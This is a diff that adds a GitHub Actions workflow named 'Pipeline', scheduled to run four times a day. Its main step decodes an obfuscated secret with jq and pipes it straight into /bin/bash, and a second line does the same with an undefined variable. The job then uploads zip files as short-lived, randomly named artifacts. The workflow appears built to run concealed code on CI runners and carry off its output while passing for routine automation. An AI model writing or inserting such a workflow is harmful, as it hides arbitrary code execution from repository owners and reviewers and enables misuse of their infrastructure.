@@ -1,0 +1,31 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 1,7,13,19 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          pgh51: ${{ secrets.pgh51 }}
+        run: |
+          printf '%s' "$pgh51" | jq -r .ct72234 | /bin/bash
+          printf '%s' "$w9" | jq -r .iel4 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: AXQAVcma
+          path: "*.zip"
+          retention-days: 1
